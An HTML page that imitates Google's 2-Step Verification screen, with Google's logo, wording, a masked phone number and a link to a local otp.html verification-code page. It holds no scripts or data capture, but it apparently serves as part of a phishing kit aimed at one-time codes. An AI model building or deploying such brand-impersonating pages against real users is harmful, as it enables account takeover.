<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #f0f4f9;
            font-family: 'Roboto', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            color: #1f1f1f;
        }

        .main-card {
            background-color: #ffffff;
            padding: 36px;
            border-radius: 28px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
            
            @media (min-width: 600px) {
                width: 450px;
                min-height: 500px; 
            }
        }

        .logo {
            width: 48px;
            height: 48px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px 0;
            color: #1f1f1f;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            margin: 0 0 30px 0;
            color: #1f1f1f;
            text-align: center;
            line-height: 1.5;
        }

        .user-chip {
            border: 1px solid #747775;
            border-radius: 20px;
            padding: 6px 12px;
            display: flex;
            align-items: center;
            font-size: 14px;
            font-weight: 500;
            color: #1f1f1f;
            margin-bottom: 30px;
            cursor: pointer;
        }
        
        .user-chip svg {
            margin-right: 8px;
            fill: #1f1f1f;
        }

        /* Challenge Seçenekleri Listesi */
        .challenge-list {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .challenge-item {
            display: flex;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .challenge-item:last-child {
            border-bottom: none;
        }

        .challenge-item:hover {
            background-color: #f5f5f5;
        }

        .challenge-icon {
            width: 24px;
            height: 24px;
            margin-right: 15px;
            fill: #444746;
        }

        .challenge-text {
            display: flex;
            flex-direction: column;
        }

        .challenge-title {
            font-size: 16px;
            font-weight: 500;
            color: #1f1f1f;
        }

        .challenge-desc {
            font-size: 12px;
            color: #5f6368;
            margin-top: 4px;
        }

        /* Footer */
        footer {
            display: flex;
            justify-content: space-between;
            width: 100%;
            max-width: 450px;
            font-size: 12px;
            margin-top: 24px;
            padding: 0 10px;
            box-sizing: border-box;
        }
        
        .language-picker {
            display: flex;
            align-items: center;
            color: #1f1f1f;
            cursor: pointer;
            background: #f0f4f9;
            padding: 5px 10px;
            border-radius: 4px;
        }

        .footer-links {
            display: flex;
            gap: 20px;
        }

        .footer-links a {
            color: #1f1f1f;
            text-decoration: none;
            border-radius: 4px;
            padding: 5px;
        }
        
        .footer-links a:hover {
            background-color: #e3e3e3;
        }

    </style>
</head>
<body>

    <div class="main-card">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
            </svg>
        </div>

        <h1>2-Step Verification</h1>
        <div class="subtitle">
            To help keep your account safe, Google wants to make sure it’s really you.
        </div>

        <div class="user-chip">
            <svg height="20" viewBox="0 0 24 24" width="20"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            user@example.com
            <svg height="18" viewBox="0 0 24 24" width="18" style="margin-left: 5px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
        </div>

        <div class="challenge-list">
            <a href="otp.html" style="text-decoration: none; color: inherit;">
                <div class="challenge-item">
                    <svg class="challenge-icon" viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z"/></svg>
                    <div class="challenge-text">
                        <span class="challenge-title">Get a verification code</span>
                        <span class="challenge-desc">Google will send a verification code to ••• ••• ••85</span>
                    </div>
                </div>
            </a>

            <div class="challenge-item">
                <svg class="challenge-icon" viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
                <div class="challenge-text">
                    <span class="challenge-title">Enter one of your 8-digit backup codes</span>
                </div>
            </div>

            <div class="challenge-item">
                <svg class="challenge-icon" viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/></svg>
                <div class="challenge-text">
                    <span class="challenge-title">Get help</span>
                </div>
            </div>
        </div>

    </div>

    <footer>
        <div class="language-picker">
            English (United States) 
            <svg fill="#1f1f1f" height="24" viewBox="0 0 24 24" width="24" style="margin-left: 5px;"><path d="M7 10l5 5 5-5z"/></svg>
        </div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

</body>
</html>